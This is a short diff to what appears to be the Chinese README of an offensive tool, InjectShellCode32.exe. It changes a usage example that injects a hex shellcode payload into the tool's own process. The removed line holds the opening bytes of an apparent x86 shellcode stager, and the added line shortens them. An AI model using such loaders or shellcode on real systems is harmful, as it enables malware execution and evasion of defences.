@@ -163,7 +163,7 @@ InjectShellCode32.exe XorArray --path d://array.txt --passwd lyshark
 
  - 将攻击载荷注入到自身进程内
 ```C
-InjectShellCode32.exe InjectSelfShell --shellcode fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...
+InjectShellCode32.exe InjectSelfShell --shellcode fce88f00002c201...
 [+] 解码地址: 19db64
 ```
 
